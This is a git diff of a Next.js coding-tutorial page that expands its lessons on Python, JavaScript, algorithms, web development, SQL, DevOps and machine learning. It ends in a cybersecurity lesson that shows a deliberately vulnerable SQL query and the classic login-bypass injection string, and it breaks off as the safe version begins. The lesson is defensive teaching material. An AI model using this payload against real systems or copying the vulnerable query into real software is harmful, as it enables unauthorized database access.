@@ -3,8 +3,8 @@
 import Link from 'next/link'
 import { useState } from 'react'
 import { motion } from 'framer-motion'
-import { 
-  Code2, 
+import {
+  Code2,
   ArrowLeft,
   ArrowRight,
   CheckCircle2,
@@ -12,244 +12,287 @@ import {
   Copy,
   Check,
   BookOpen,
-  Sparkles
+  Sparkles,
+  ChevronRight,
+  Terminal,
+  Binary,
+  Globe,
+  Brain,
+  Database,
+  Network,
+  GitBranch,
+  ShieldCheck,
 } from 'lucide-react'
 import Header from '@/components/layout/Header'
-import { Card, CardContent } from '@/components/ui/card'
-import { Badge } from '@/components/ui/badge'
-import { Button } from '@/components/ui/button'
+import Footer from '@/components/layout/Footer'
 
+// ─── Topics & Lessons ──────────────────────────────────────────────────────────
 const topics = [
-  { id: 'python', name: 'Python', lessons: ['Introduction', 'Variables', 'Data Types', 'Operators', 'Strings', 'Lists', 'Tuples', 'Dictionaries', 'Conditionals', 'Loops', 'Functions', 'Classes'] },
-  { id: 'javascript', name: 'JavaScript', lessons: ['Introduction', 'Variables', 'Data Types', 'Operators', 'Strings', 'Arrays', 'Objects', 'Conditionals', 'Loops', 'Functions', 'DOM', 'Events'] },
-  { id: 'data-structures', name: 'Data Structures', lessons: ['Arrays', 'Linked Lists', 'Stacks', 'Queues', 'Trees', 'Graphs', 'Hash Tables', 'Heaps'] },
-  { id: 'algorithms', name: 'Algorithms', lessons: ['Sorting', 'Searching', 'Recursion', 'Dynamic Programming', 'Greedy', 'Graph Algorithms'] },
-  { id: 'web-dev', name: 'Web Development', lessons: ['HTML Basics', 'CSS Basics', 'Flexbox', 'Grid', 'Responsive Design', 'JavaScript DOM'] },
-  { id: 'ml', name: 'Machine Learning', lessons: ['Intro to ML', 'Linear Regression', 'Logistic Regression', 'Neural Networks', 'Scikit-learn'] }
+  { id: 'python',           name: 'Python',           icon: Terminal,    lessons: ['Introduction', 'Variables', 'Data Types', 'Strings', 'Lists', 'Functions', 'Classes', 'Modules'] },
+  { id: 'javascript',       name: 'JavaScript',       icon: Code2,       lessons: ['Introduction', 'Variables', 'Data Types', 'Arrays', 'Objects', 'Functions', 'DOM', 'Async/Await'] },
+  { id: 'data-structures',  name: 'Data Structures',  icon: Binary,      lessons: ['Arrays', 'Linked Lists', 'Stacks', 'Queues', 'Trees', 'Graphs', 'Hash Tables', 'Heaps'] },
+  { id: 'algorithms',       name: 'Algorithms',       icon: Brain,       lessons: ['Sorting', 'Searching', 'Recursion', 'Dynamic Programming', 'Greedy', 'Graph Algorithms'] },
+  { id: 'web-dev',          name: 'Web Development',  icon: Globe,       lessons: ['HTML Basics', 'CSS Basics', 'Flexbox', 'Grid', 'Responsive Design', 'JavaScript DOM'] },
+  { id: 'databases',        name: 'SQL & Databases',  icon: Database,    lessons: ['SELECT Basics', 'Filtering', 'Joins', 'Aggregations', 'Indexes', 'Transactions'] },
+  { id: 'system-design',    name: 'System Design',    icon: Network,     lessons: ['Scalability', 'Load Balancing', 'Caching', 'Databases at Scale', 'Microservices', 'Message Queues'] },
+  { id: 'devops',           name: 'DevOps & CI/CD',   icon: GitBranch,   lessons: ['Docker Basics', 'Docker Compose', 'GitHub Actions', 'Kubernetes', 'Cloud Deployment'] },
+  { id: 'ml',               name: 'Machine Learning', icon: Brain,       lessons: ['Intro to ML', 'Linear Regression', 'Logistic Regression', 'Neural Networks', 'Scikit-learn'] },
+  { id: 'cybersecurity',    name: 'Cybersecurity',    icon: ShieldCheck, lessons: ['SQL Injection', 'XSS', 'CSRF', 'Broken Authentication', 'Path Traversal', 'Secure Coding'] },
 ]
 
-const tutorialContent = {
+// ─── Lesson Content ────────────────────────────────────────────────────────────
+const tutorialContent: Record<string, Record<string, { title: string; content: string; code: string; tryIt: boolean }>> = {
   python: {
     Introduction: {
       title: 'Python Introduction',
-      content: `Python is a popular programming language. It was created by Guido van Rossum, and released in 1991.
+      content: `Python is a popular, high-level programming language created by Guido van Rossum and released in 1991.
 
-Python is used for:
+It is used for:
 - Web development (server-side)
-- Software development
-- Mathematics
-- System scripting`,
+- Data Science & Machine Learning
+- Automation and scripting
+- Desktop applications
+
+Python prioritizes readability and simplicity, making it the ideal first language for engineers.`,
       code: `print("Hello, World!")
 
 # This is a comment
-name = "BlueLearnerHub"
-print(f"Welcome to {name}")`,
-      tryIt: true
+name = "BlueCoderHub"
+version = 2.0
+
+print(f"Welcome to {name} v{version}")
+
+# Python is dynamically typed
+x = 42        # int
+y = 3.14      # float
+z = "hello"   # str
+b = True      # bool`,
+      tryIt: true,
     },
     Variables: {
       title: 'Python Variables',
-      content: `Variables are containers for storing data values. Python has no command for declaring a variable.
+      content: `Variables are containers for storing data values. Python has no command for declaring a variable — it is created the moment you first assign a value to it.
 
-A variable is created the moment you first assign a value to it.`,
+Python is dynamically typed: you don't need to declare the type of a variable.`,
       code: `# Creating variables
 x = 5
 y = "John"
 z = 3.14
 
-# Print variables
-print(x)
-print(y)
-print(z)
+print(x)  # 5
+print(y)  # John
+print(z)  # 3.14
 
-# Check types
+# Check type
 print(type(x))  # <class 'int'>
-print(type(y))  # <class 'str'>`,
-      tryIt: true
+print(type(y))  # <class 'str'>
+
+# Multiple assignment
+a, b, c = 1, 2, 3
+print(a, b, c)  # 1 2 3`,
+      tryIt: true,
     },
     Strings: {
       title: 'Python Strings',
-      content: `Strings in Python are surrounded by either single or double quotation marks.
+      content: `Strings in Python are surrounded by single or double quotation marks. Use triple quotes for multi-line strings.
 
-You can use triple quotes for multi-line strings.`,
-      code: `# String examples
-a = "Hello"
+Key string operations: slicing, methods (upper, lower, strip, replace), and f-strings.`,
+      code: `a = "Hello"
 b = 'World'
+multi = """This is
+a multiline
+string"""
 
 # String methods
 text = "  Hello, Python!  "
-print(text.strip())    # Remove whitespace
-print(text.upper())    # UPPERCASE
-print(text.lower())    # lowercase
+print(text.strip())           # Remove whitespace
+print(text.upper())           # UPPERCASE
 print(text.replace("Python", "World"))
 
 # String slicing
-msg = "BlueLearnerHub"
-print(msg[0:4])    # Blue
-print(msg[-4:])    # erHub`,
-      tryIt: true
+msg = "BlueCoderHub"
+print(msg[0:4])   # Blue
+print(msg[-3:])   # Hub
+print(msg[::-1])  # buHredoCeulB
+
+# f-strings (Python 3.6+)
+name = "Engineer"
+xp = 1200
+print(f"Welcome, {name}! XP: {xp}")`,
+      tryIt: true,
     },
     Lists: {
       title: 'Python Lists',
-      content: `Lists are used to store multiple items in a single variable.
+      content: `Lists store multiple items in a single variable. They are ordered, changeable, and allow duplicate values.
 
-Lists are one of 4 built-in data types in Python used to store collections of data.`,
+Lists are one of the 4 built-in data types in Python used to store collections of data.`,
       code: `# Create a list
 fruits = ["apple", "banana", "cherry"]
 
 # Access items
 print(fruits[0])   # apple
+print(fruits[-1])  # cherry (last)
 
 # Modify
 fruits[0] = "orange"
 fruits.append("mango")
 fruits.remove("banana")
 
-# Loop through list
+# Slicing
+print(fruits[1:3])  # ['cherry', 'mango']
+
+# Loop
 for fruit in fruits:
-    print(fruit)`,
-      tryIt: true
+    print(fruit)
+
+# List comprehension
+squares = [x**2 for x in range(5)]
+print(squares)  # [0, 1, 4, 9, 16]`,
+      tryIt: true,
     },
     Functions: {
       title: 'Python Functions',
-      content: `A function is a block of code which only runs when it is called.
+      content: `A function is a block of code that runs when it is called. You can pass data (parameters) into a function and it can return a result.
 
-You can pass data, known as parameters, into a function.`,
+Functions help you avoid repetition and make your code reusable.`,
       code: `# Define a function
 def greet(name):
     return f"Hello, {name}!"
 
 # Call function
-message = greet("BlueLearnerHub")
+message = greet("BlueCoderHub")
 print(message)
 
-# Function with default parameter
+# Default parameter
 def power(base, exponent=2):
     return base ** exponent
 
 print(power(3))     # 9
-print(power(3, 3))  # 27`,
-      tryIt: true
-    }
+print(power(3, 3))  # 27
+
+# *args and **kwargs
+def summarize(*args, **kwargs):
+    print("Args:", args)
+    print("Kwargs:", kwargs)
+
+summarize(1, 2, 3, name="Alice", score=95)`,
+      tryIt: true,
+    },
   },
   javascript: {
     Introduction: {
       title: 'JavaScript Introduction',
-      content: `JavaScript is the world's most popular programming language.
+      content: `JavaScript is the world's most popular programming language and the language of the Web.
 
-JavaScript is the language of the Web. It is used to make websites interactive.`,
+It runs in browsers, on servers (Node.js), and in mobile apps. JavaScript makes web pages interactive.`,
       code: `// Hello World
 console.log("Hello, World!");
 
 // Variables
-let name = "BlueLearnerHub";
+let name = "BlueCoderHub";
 const PI = 3.14159;
+var legacy = "old style";
 
-console.log(\`Welcome to \${name}\`);`,
-      tryIt: true
-    },
-    Variables: {
-      title: 'JavaScript Variables',
-      content: `JavaScript variables are containers for storing data values.
+console.log(\`Welcome to \${name}\`);
 
-Use let for variables that can change, const for constants.`,
-      code: `// Variable declarations
-let age = 25;        // Can be reassigned
-const name = "John"; // Cannot be reassigned
+// Template literals
+const score = 1200;
+console.log(\`XP Score: \${score} points!\`);
 
-// Different data types
-let num = 42;           // Number
-let text = "Hello";     // String
-let isActive = true;    // Boolean
-let items = [1, 2, 3];  // Array
-let person = {          // Object
-  name: "John",
-  age: 25
-};`,
-      tryIt: true
+// Arithmetic
+console.log(2 ** 10);  // 1024
+console.log(17 % 5);   // 2`,
+      tryIt: true,
     },
     Arrays: {
       title: 'JavaScript Arrays',
-      content: `JavaScript arrays are used to store multiple values in a single variable.
+      content: `Arrays store multiple values. They are zero-indexed and support dozens of built-in methods for filtering, mapping, and reducing data.`,
+      code: `const fruits = ["apple", "banana", "cherry"];
 
-Array indexes are zero-based, meaning the first item is [0].`,
-      code: `// Create an array
-const fruits = ["apple", "banana", "cherry"];
+// Access
+console.log(fruits[0]);   // apple
+console.log(fruits.length); // 3
 
-// Access elements
-console.log(fruits[0]);  // apple
-
-// Add element
+// Mutate
 fruits.push("orange");
+fruits.unshift("grape"); // add to front
 
-// Loop through array
-fruits.forEach((fruit, index) => {
-  console.log(index + ": " + fruit);
-});
+// Iteration
+fruits.forEach((f, i) => console.log(i, f));
 
-// Array methods
-console.log(fruits.length);
-console.log(fruits.sort());`,
-      tryIt: true
+// Functional methods
+const upper = fruits.map(f => f.toUpperCase());
+const long  = fruits.filter(f => f.length > 5);
+const found = fruits.find(f => f.startsWith("m"));
+
+console.log(upper);
+console.log(long);`,
+      tryIt: true,
     },
     Functions: {
       title: 'JavaScript Functions',
-      content: `A JavaScript function is a block of code designed to perform a particular task.
-
-A JavaScript function is executed when "something" invokes it (calls it).`,
-      code: `// Function declaration
+      content: `Functions are the building blocks of JavaScript. Use function declarations, expressions, or arrow functions.`,
+      code: `// Declaration
 function greet(name) {
   return "Hello, " + name + "!";
 }
 
+// Expression
+const add = function(a, b) { return a + b; };
+
 // Arrow function
-const add = (a, b) => a + b;
+const multiply = (a, b) => a * b;
 
-// Call functions
-console.log(greet("World"));
-console.log(add(5, 3));
+// Default params
+function power(base, exp = 2) {
+  return Math.pow(base, exp);
+}
 
-// Function with default parameter
-function power(base, exponent = 2) {
-  return Math.pow(base, exponent);
-}`,
-      tryIt: true
-    }
+console.log(greet("World"));   // Hello, World!
+console.log(add(5, 3));        // 8
+console.log(multiply(4, 6));   // 24
+console.log(power(3));         // 9
+console.log(power(2, 10));     // 1024`,
+      tryIt: true,
+    },
   },
   'data-structures': {
     Arrays: {
-      title: 'Arrays Data Structure',
-      content: `An array is a collection of elements stored at contiguous memory locations.
+      title: 'Arrays',
+      content: `An array is a collection of elements stored at contiguous memory locations. It is the simplest and most widely used data structure.
 
-Arrays are the simplest and most widely used data structure.`,
-      code: `// Array implementation in Python
-class Array:
-    def __init__(self, size):
-        self.size = size
-        self.array = [None] * size
-    
-    def get(self, index):
-        if 0 <= index < self.size:
-            return self.array[index]
-        return "Index out of bounds"
-    
-    def set(self, index, value):
-        if 0 <= index < self.size:
-            self.array[index] = value
-        else:
-            print("Index out of bounds")
+**Time complexity:** Access O(1), Search O(n), Insert/Delete O(n).`,
+      code: `# Array operations in Python
+arr = [10, 20, 30, 40, 50]
 
-# Usage
-arr = Array(5)
-arr.set(0, 10)
-arr.set(1, 20)
-print(arr.get(0))  # 10`,
-      tryIt: true
+# Access O(1)
+print(arr[2])   # 30
+
+# Search O(n)
+target = 30
+for i, val in enumerate(arr):
+    if val == target:
+        print(f"Found {target} at index {i}")
+
+# Insert at position O(n)
+arr.insert(2, 25)   # [10, 20, 25, 30, 40, 50]
+
+# Delete O(n)
+arr.pop(0)          # Remove first element
+
+# 2D Array (Matrix)
+matrix = [[1, 2, 3],
+          [4, 5, 6],
+          [7, 8, 9]]
+
+print(matrix[1][2])  # 6`,
+      tryIt: true,
     },
     'Linked Lists': {
       title: 'Linked Lists',
-      content: `A linked list is a linear data structure where elements are not stored at contiguous memory locations.
+      content: `A linked list is a linear data structure where elements are stored as nodes, each containing data and a pointer to the next node.
 
-The elements in a linked list are linked using pointers.`,
+Unlike arrays, linked list elements are NOT stored at contiguous memory locations.`,
       code: `class Node:
     def __init__(self, data):
         self.data = data
@@ -270,25 +313,25 @@ class LinkedList:
         current.next = new_node
     
     def display(self):
+        nodes = []
         current = self.head
         while current:
-            print(current.data, end -> )
+            nodes.append(str(current.data))
             current = current.next
-        print("None")
+        print(" -> ".join(nodes))
 
-# Usage
 ll = LinkedList()
 ll.append(10)
 ll.append(20)
 ll.append(30)
-ll.display()  # 10 -> 20 -> 30 -> None`,
-      tryIt: true
+ll.display()  # 10 -> 20 -> 30`,
+      tryIt: true,
     },
     Stacks: {
       title: 'Stacks',
-      content: `A stack is a linear data structure which follows a particular order in which the operations are performed.
+      content: `A stack is a LIFO (Last In First Out) data structure. The last element pushed is the first to be popped.
 
-The order is LIFO (Last In First Out).`,
+Use cases: undo/redo, browser history, function call stack, expression evaluation.`,
       code: `class Stack:
     def __init__(self):
         self.items = []
@@ -304,27 +347,34 @@ The order is LIFO (Last In First Out).`,
     def peek(self):
         if not self.is_empty():
             return self.items[-1]
-        return "Stack is empty"
     
     def is_empty(self):
         return len(self.items) == 0
+    
+    def size(self):
+        return len(self.items)
 
 # Usage
 stack = Stack()
 stack.push(10)
 stack.push(20)
 stack.push(30)
-print(stack.pop())    # 30
-print(stack.peek())   # 20`,
-      tryIt: true
-    }
+print(stack.peek())  # 30 (top)
+print(stack.pop())   # 30
+print(stack.size())  # 2`,
+      tryIt: true,
+    },
   },
   algorithms: {
     Sorting: {
       title: 'Sorting Algorithms',
-      content: `Sorting algorithms are used to arrange data in a particular order.
+      content: `Sorting algorithms arrange data in a specific order. Understanding time and space complexity helps you choose the right algorithm.
 
-Common sorting algorithms include Bubble Sort, Quick Sort, Merge Sort, and Insertion Sort.`,
+| Algorithm | Best | Average | Worst | Space |
+|-----------|------|---------|-------|-------|
+| Bubble Sort | O(n) | O(n²) | O(n²) | O(1) |
+| Quick Sort | O(n log n) | O(n log n) | O(n²) | O(log n) |
+| Merge Sort | O(n log n) | O(n log n) | O(n log n) | O(n) |`,
       code: `# Bubble Sort
 def bubble_sort(arr):
     n = len(arr)
@@ -339,29 +389,48 @@ def quick_sort(arr):
     if len(arr) <= 1:
         return arr
     pivot = arr[len(arr) // 2]
-    left = [x for x in arr if x < pivot]
+    left   = [x for x in arr if x < pivot]
     middle = [x for x in arr if x == pivot]
-    right = [x for x in arr if x > pivot]
+    right  = [x for x in arr if x > pivot]
     return quick_sort(left) + middle + quick_sort(right)
 
-# Test
+# Merge Sort
+def merge_sort(arr):
+    if len(arr) <= 1:
+        return arr
+    mid = len(arr) // 2
+    left  = merge_sort(arr[:mid])
+    right = merge_sort(arr[mid:])
+    return merge(left, right)
+
+def merge(left, right):
+    result = []
+    i = j = 0
+    while i < len(left) and j < len(right):
+        if left[i] <= right[j]:
+            result.append(left[i]); i += 1
+        else:
+            result.append(right[j]); j += 1
+    return result + left[i:] + right[j:]
+
 arr = [64, 34, 25, 12, 22, 11, 90]
 print(quick_sort(arr))  # [11, 12, 22, 25, 34, 64, 90]`,
-      tryIt: true
+      tryIt: true,
     },
     Searching: {
       title: 'Searching Algorithms',
-      content: `Searching algorithms are used to find a target element in a collection.
+      content: `Searching algorithms find a target element in a collection.
 
-Common searching algorithms include Linear Search and Binary Search.`,
-      code: `# Linear Search
+- **Linear Search**: O(n) — works on any array
+- **Binary Search**: O(log n) — requires sorted array`,
+      code: `# Linear Search O(n)
 def linear_search(arr, target):
     for i, val in enumerate(arr):
         if val == target:
             return i
     return -1
 
-# Binary Search (sorted array)
+# Binary Search O(log n) — array must be sorted!
 def binary_search(arr, target):
     left, right = 0, len(arr) - 1
     while left <= right:
@@ -377,248 +446,460 @@ def binary_search(arr, target):
 # Test
 arr = [1, 3, 5, 7, 9, 11, 13, 15]
 print(binary_search(arr, 7))   # 3
-print(binary_search(arr, 6))   # -1`,
-      tryIt: true
+print(binary_search(arr, 6))   # -1
+
+# Recursive Binary Search
+def binary_search_r(arr, target, lo=0, hi=None):
+    if hi is None:
+        hi = len(arr) - 1
+    if lo > hi:
+        return -1
+    mid = (lo + hi) // 2
+    if arr[mid] == target:
+        return mid
+    elif arr[mid] < target:
+        return binary_search_r(arr, target, mid+1, hi)
+    else:
+        return binary_search_r(arr, target, lo, mid-1)`,
+      tryIt: true,
     },
     Recursion: {
       title: 'Recursion',
-      content: `Recursion is a method where the solution to a problem depends on solutions to smaller instances of the same problem.`,
-      code: `# Factorial using recursion
+      content: `Recursion is when a function calls itself to solve smaller instances of a problem. Every recursive solution needs:
+1. A base case (termination condition)
+2. A recursive case`,
+      code: `# Factorial
 def factorial(n):
-    if n <= 1:
+    if n <= 1:             # base case
         return 1
-    return n * factorial(n - 1)
+    return n * factorial(n - 1)  # recursive case
 
-# Fibonacci using recursion
+# Fibonacci
 def fibonacci(n):
     if n <= 1:
         return n
-    return fibonacci(n - 1) + fibonacci(n - 2)
+    return fibonacci(n-1) + fibonacci(n-2)
 
-# Fibonacci with memoization
-def fibonacci_memo(n, memo={}):
+# Fibonacci with memoization (much faster)
+def fib_memo(n, memo={}):
     if n in memo:
         return memo[n]
     if n <= 1:
         return n
-    memo[n] = fibonacci_memo(n-1, memo) + fibonacci_memo(n-2, memo)
+    memo[n] = fib_memo(n-1, memo) + fib_memo(n-2, memo)
     return memo[n]
 
-# Test
-print(factorial(5))           # 120
-print(fibonacci(10))          # 55
-print(fibonacci_memo(50))    # 12586269025`,
-      tryIt: true
-    }
+print(factorial(5))        # 120
+print(fibonacci(10))       # 55
+print(fib_memo(50))        # 12586269025
+
+# Tower of Hanoi
+def hanoi(n, src, dst, aux):
+    if n == 1:
+        print(f"Move disk 1 from {src} to {dst}")
+        return
+    hanoi(n-1, src, aux, dst)
+    print(f"Move disk {n} from {src} to {dst}")
+    hanoi(n-1, aux, dst, src)
+
+hanoi(3, 'A', 'C', 'B')`,
+      tryIt: true,
+    },
   },
   'web-dev': {
     'HTML Basics': {
       title: 'HTML Basics',
-      content: `HTML (HyperText Markup Language) is the standard markup language for creating web pages.
-
-HTML describes the structure of a web page.`,
+      content: `HTML (HyperText Markup Language) is the standard markup language for creating web pages. HTML describes the structure of a web page using elements represented by tags.`,
       code: `<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>My First Page</title>
 </head>
 <body>
-    <h1>Welcome to BlueLearnerHub</h1>
-    <p>This is my first webpage!</p>
-    <a href="https://example.com">Click Here</a>
-    <ul>
-        <li>Item 1</li>
-        <li>Item 2</li>
-    </ul>
+    <header>
+        <h1>Welcome to BlueCoderHub</h1>
+        <nav>
+            <a href="#about">About</a>
+            <a href="#learn">Learn</a>
+        </nav>
+    </header>
+    
+    <main id="learn">
+        <section>
+            <h2>Start Learning</h2>
+            <p>Master engineering with free lessons.</p>
+            <ul>
+                <li>Computer Science</li>
+                <li>Mechanical Engineering</li>
+                <li>Electrical Engineering</li>
+            </ul>
+            <button>Get Started →</button>
+        </section>
+    </main>
+    
+    <footer>
+        <p>&copy; 2026 BlueCoderHub</p>
+    </footer>
 </body>
 </html>`,
-      tryIt: true
+      tryIt: true,
     },
     'CSS Basics': {
       title: 'CSS Basics',
-      content: `CSS (Cascading Style Sheets) is used to style and layout web pages.
+      content: `CSS (Cascading Style Sheets) controls the visual presentation of HTML. It handles colors, fonts, spacing, layout, and responsive design.`,
+      code: `/* Selectors */
+h1 { color: #2d47d8; }          /* Element */
+.card { border-radius: 12px; }  /* Class */
+#hero { background: #eef2fb; }  /* ID */
 
-CSS can change fonts, colors, spacing, and much more.`,
-      code: `/* Internal CSS */
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f0f0f0;
-    }
-    
-    h1 {
-        color: #333;
-        text-align: center;
-    }
-    
-    .container {
-        max-width: 800px;
-        margin: 0 auto;
-        padding: 20px;
-    }
-    
-    .btn {
-        background-color: blue;
-        color: white;
-        padding: 10px 20px;
-        border: none;
-        border-radius: 5px;
-    }
-</style>`,
-      tryIt: true
+/* Box Model */
+.box {
+    width: 300px;
+    padding: 20px;        /* inside spacing */
+    border: 2px solid #ccc;
+    margin: 16px auto;    /* outside spacing */
+}
+
+/* Colors */
+.btn {
+    background-color: #2d47d8;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 8px;
+    cursor: pointer;
+}
+
+.btn:hover {
+    background-color: #1e35c0;
+    transform: translateY(-1px);
+}
+
+/* Variables */
+:root {
+    --primary: #2d47d8;
+    --bg: #eef2fb;
+    --font-mono: 'Space Mono', monospace;
+}`,
+      tryIt: true,
     },
     Flexbox: {
       title: 'CSS Flexbox',
-      content: `Flexbox is a CSS layout module designed for one-dimensional layouts.
-
-It excels at distributing space along a single axis.`,
-      code: `/* Flexbox container */
-.container {
+      content: `Flexbox is a CSS layout module for one-dimensional layouts (row or column). It handles alignment, distribution, and ordering of items along a single axis.`,
+      code: `/* Flex container */
+.nav {
     display: flex;
-    justify-content: space-between;
+    justify-content: space-between; /* main axis */
+    align-items: center;            /* cross axis */
+    padding: 0 24px;
+    height: 56px;
+}
+
+/* Center content */
+.hero {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
     align-items: center;
+    min-height: 60vh;
+    gap: 16px;  /* spacing between children */
+}
+
+/* Responsive card grid */
+.cards {
+    display: flex;
+    flex-wrap: wrap;
     gap: 20px;
 }
 
-/* Flex items */
-.item {
-    flex: 1;
-}
-
-/* Center alignment */
-.center {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-}
-
-/* Responsive flex */
-.responsive {
-    display: flex;
-    flex-wrap: wrap;
-}
-
-.responsive > * {
-    flex: 1 1 300px;
+.card {
+    flex: 1 1 280px;  /* grow, shrink, min-basis */
+    border: 1px solid #e0e0e0;
+    border-radius: 12px;
+    padding: 20px;
 }`,
-      tryIt: true
+      tryIt: true,
     },
     Grid: {
       title: 'CSS Grid',
-      content: `CSS Grid Layout is a two-dimensional layout system for the web.
-
-It lets you lay out items in rows and columns.`,
-      code: `/* Grid container */
-.grid-container {
+      content: `CSS Grid is a two-dimensional layout system for rows AND columns simultaneously. Perfect for page-level layouts and complex card grids.`,
+      code: `/* Basic 3-column grid */
+.lesson-grid {
     display: grid;
     grid-template-columns: repeat(3, 1fr);
-    grid-template-rows: auto;
     gap: 20px;
 }
 
-/* Spanning columns */
-.card {
-    grid-column: span 2;
+/* Responsive auto-fill */
+.card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 16px;
 }
 
-/* Grid template areas */
-.layout {
+/* Named template areas */
+.page-layout {
     display: grid;
     grid-template-areas:
-        "header header"
-        "sidebar main"
-        "footer footer";
-    grid-template-columns: 200px 1fr;
-    grid-template-rows: auto 1fr auto;
+        "header  header"
+        "sidebar main  "
+        "footer  footer";
+    grid-template-columns: 240px 1fr;
+    grid-template-rows: 56px 1fr auto;
+    min-height: 100vh;
 }
 
-.header { grid-area: header; }
+.header  { grid-area: header; }
 .sidebar { grid-area: sidebar; }
-.main { grid-area: main; }
-.footer { grid-area: footer; }`,
-      tryIt: true
-    }
+.main    { grid-area: main; }
+.footer  { grid-area: footer; }`,
+      tryIt: true,
+    },
+  },
+  databases: {
+    'SELECT Basics': {
+      title: 'SELECT Basics',
+      content: `SQL SELECT is used to query data from one or more tables. It is the most frequently used SQL statement.`,
+      code: `-- Select all columns
+SELECT * FROM students;
+
+-- Select specific columns
+SELECT name, email, score
+FROM students;
+
+-- Filter with WHERE
+SELECT name, score
+FROM students
+WHERE score >= 90;
+
+-- Sort results
+SELECT name, score
+FROM students
+ORDER BY score DESC;
+
+-- Limit results
+SELECT name, score
+FROM students
+ORDER BY score DESC
+LIMIT 10;
+
+-- Distinct values
+SELECT DISTINCT department
+FROM students;`,
+      tryIt: true,
+    },
+    Joins: {
+      title: 'SQL Joins',
+      content: `Joins combine rows from two or more tables based on a related column. The main types are INNER, LEFT, RIGHT, and FULL OUTER JOIN.`,
+      code: `-- INNER JOIN: rows where both tables match
+SELECT s.name, c.course_name, e.grade
+FROM students s
+INNER JOIN enrollments e ON s.id = e.student_id
+INNER JOIN courses c ON e.course_id = c.id;
+
+-- LEFT JOIN: all students, even without enrollments
+SELECT s.name, c.course_name
+FROM students s
+LEFT JOIN enrollments e ON s.id = e.student_id
+LEFT JOIN courses c ON e.course_id = c.id;
+
+-- Self Join: find students in same department
+SELECT a.name AS student1, b.name AS student2
+FROM students a
+JOIN students b ON a.department = b.department
+  AND a.id < b.id;`,
+      tryIt: true,
+    },
+  },
+  'system-design': {
+    Scalability: {
+      title: 'Scalability',
+      content: `Scalability is the system's ability to handle growing amounts of work. Two main approaches:
+
+- **Vertical Scaling** (Scale Up): Add more CPU/RAM to existing server. Has limits.
+- **Horizontal Scaling** (Scale Out): Add more servers. Requires load balancing.`,
+      code: `// Design checklist for scalable systems
+const scalabilityChecklist = {
+  "Identify bottlenecks": [
+    "Database queries (add indexes)",
+    "Heavy computations (offload to background jobs)",
+    "File I/O (use CDN + object storage)",
+    "Memory limits (add caching layer)"
+  ],
+  
+  "Apply patterns": {
+    "Load Balancer": "Distributes traffic across servers",
+    "Caching": "Redis/Memcached for hot data",
+    "CDN": "Static assets served globally",
+    "Database Sharding": "Split data across DB instances",
+    "Read Replicas": "Scale reads independently",
+    "Message Queue": "Decouple services (RabbitMQ, Kafka)"
+  },
+  
+  "Estimation": {
+    "1M users": "1-2 app servers, single DB",
+    "10M users": "Auto-scaling group, read replicas",
+    "100M users": "Multi-region, sharding, CDN"
+  }
+};`,
+      tryIt: true,
+    },
+  },
+  devops: {
+    'Docker Basics': {
+      title: 'Docker Basics',
+      content: `Docker packages applications and their dependencies into containers — isolated, portable environments that run consistently everywhere.
+
+Key concepts: Image, Container, Dockerfile, Docker Hub, Volumes, Networks.`,
+      code: `# Dockerfile for a Node.js app
+FROM node:18-alpine
+
+WORKDIR /app
+
+# Copy package files first (layer caching)
+COPY package*.json ./
+RUN npm ci --only=production
+
+# Copy source code
+COPY . .
+
+EXPOSE 3000
+
+CMD ["node", "server.js"]
+
+# --- Common Docker commands ---
+# docker build -t myapp:v1 .         # Build image
+# docker run -p 3000:3000 myapp:v1   # Run container
+# docker ps                          # List running containers
+# docker logs <container-id>         # View logs
+# docker exec -it <id> sh            # Shell into container
+# docker stop <id>                   # Stop container
+# docker push myapp:v1               # Push to registry`,
+      tryIt: true,
+    },
   },
   ml: {
     'Intro to ML': {
       title: 'Introduction to Machine Learning',
-      content: `Machine Learning is a subset of artificial intelligence that enables systems to learn from data.
+      content: `Machine Learning enables systems to learn from data without being explicitly programmed.
 
-ML algorithms build models based on sample data to make predictions.`,
+**Types of ML:**
+- Supervised Learning: labeled training data (classification, regression)
+- Unsupervised Learning: find patterns in unlabeled data (clustering)
+- Reinforcement Learning: agent learns from rewards/penalties`,
       code: `import numpy as np
 from sklearn.datasets import load_iris
 from sklearn.model_selection import train_test_split
 from sklearn.ensemble import RandomForestClassifier
-from sklearn.metrics import accuracy_score
+from sklearn.metrics import accuracy_score, classification_report
 
-# Load data
+# Load a classic dataset
 iris = load_iris()
 X, y = iris.data, iris.target
+print(f"Dataset: {X.shape[0]} samples, {X.shape[1]} features")
 
-# Split data
+# Split into train and test sets
 X_train, X_test, y_train, y_test = train_test_split(
     X, y, test_size=0.2, random_state=42
 )
 
-# Train model
-model = RandomForestClassifier(n_estimators=100)
+# Train a model
+model = RandomForestClassifier(n_estimators=100, random_state=42)
 model.fit(X_train, y_train)
 
-# Predict
+# Evaluate
 predictions = model.predict(X_test)
 accuracy = accuracy_score(y_test, predictions)
-print(f"Accuracy: {accuracy:.2f}")`,
-      tryIt: true
+print(f"Accuracy: {accuracy:.2%}")
+print(classification_report(y_test, predictions, target_names=iris.target_names))`,
+      tryIt: true,
     },
-    'Linear Regression': {
-      title: 'Linear Regression',
-      content: `Linear Regression is a supervised learning algorithm used for predicting continuous values.
+  },
+  cybersecurity: {
+    'SQL Injection': {
+      title: 'SQL Injection',
+      content: `SQL Injection is an attack where malicious SQL code is inserted into input fields to manipulate or access a database.
 
-It finds the relationship between independent and dependent variables.`,
-      code: `import numpy as np
-import matplotlib.pyplot as plt
-from sklearn.linear_model import LinearRegression
+**Impact:** Attacker can read all data, bypass login, delete records, or execute commands.
 
-# Sample data
-X = np.array([[1], [2], [3], [4], [5]])
-y = np.array([2, 4, 5, 4, 5])
+**Prevention:** Always use parameterized queries / prepared statements.`,
+      code: `# ❌ VULNERABLE CODE — never do this!
+def get_user_bad(username, password):
+    query = f"""
+        SELECT * FROM users
+        WHERE username = '{username}'
+        AND password = '{password}'
+    """
+    # If username = "admin' OR '1'='1"
+    # The query becomes: WHERE username = 'admin' OR '1'='1'
+    # → bypasses password check!
 
-# Create and train model
-model = LinearRegression()
-model.fit(X, y)
+# ✅ SAFE CODE — parameterized query
+def get_user_safe(db, username, password):
